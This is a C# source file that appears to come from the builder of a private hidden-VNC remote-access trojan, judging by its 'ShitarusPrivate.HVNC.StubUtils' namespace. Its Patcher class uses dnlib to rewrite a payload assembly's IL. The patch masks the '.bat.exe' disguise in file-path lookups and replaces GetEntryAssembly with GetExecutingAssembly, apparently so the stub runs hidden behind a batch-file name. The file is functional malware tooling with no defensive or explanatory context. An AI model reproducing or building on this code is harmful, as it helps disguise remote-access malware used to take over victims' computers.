using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using dnlib.DotNet;
using dnlib.DotNet.Emit;

namespace ShitarusPrivate.HVNC.StubUtils
{
    public class Patcher
    {
        public static byte[] Fix(byte[] input)
        {
            ModuleDef moduleDef = ModuleDefMD.Load(input);
            foreach (TypeDef type in moduleDef.GetTypes())
            {
                if (type.IsGlobalModuleType)
                {
                    continue;
                }
                foreach (MethodDef method in type.Methods)
                {
                    if (!method.HasBody)
                    {
                        continue;
                    }
                    IList<Instruction> instructions = method.Body.Instructions;
                    for (int i = 0; i < instructions.Count; i++)
                    {
                        if (instructions[i].ToString().Contains("System.Diagnostics.ProcessModule::get_FileName()"))
                        {
                            instructions.Insert(i + 1, OpCodes.Ldstr.ToInstruction(".bat.exe"));
                            instructions.Insert(i + 2, OpCodes.Ldstr.ToInstruction(".bat"));
                            instructions.Insert(i + 3, OpCodes.Callvirt.ToInstruction(method.Module.Import(GetSystemMethod(typeof(string), "Replace", 1))));
                        }
                        else if (instructions[i].ToString().Contains("System.Reflection.Assembly::get_Location()"))
                        {
                            instructions.Insert(i + 1, OpCodes.Ldstr.ToInstruction(".bat.exe"));
                            instructions.Insert(i + 2, OpCodes.Ldstr.ToInstruction(".bat"));
                            instructions.Insert(i + 3, OpCodes.Callvirt.ToInstruction(method.Module.Import(GetSystemMethod(typeof(string), "Replace", 1))));
                        }
                        else if (instructions[i].ToString().Contains("System.Reflection.Assembly::GetEntryAssembly()"))
                        {
                            instructions[i] = OpCodes.Call.ToInstruction(method.Module.Import(GetSystemMethod(typeof(Assembly), "GetExecutingAssembly")));
                        }
                    }
                    method.Body.SimplifyBranches();
                }
            }
            MemoryStream memoryStream = new MemoryStream();
            moduleDef.Write(memoryStream);
            byte[] result = memoryStream.ToArray();
            memoryStream.Dispose();
            return result;
        }

        private static MethodDef GetSystemMethod(Type type, string name, int idx = 0)
        {
            string fullyQualifiedName = type.Module.FullyQualifiedName;
            ModuleDefMD moduleDefMD = ModuleDefMD.Load(fullyQualifiedName);
            TypeDef[] array = moduleDefMD.GetTypes().ToArray();
            List<MethodDef> list = new List<MethodDef>();
            TypeDef[] array2 = array;
            foreach (TypeDef typeDef in array2)
            {
                if (typeDef.Name != type.Name)
                {
                    continue;
                }
                foreach (MethodDef method in typeDef.Methods)
                {
                    if (!(method.Name != name))
                    {
                        list.Add(method);
                    }
                }
            }
            if (list.Count > 0)
            {
                return list[idx];
            }
            return null;
        }
    }
}
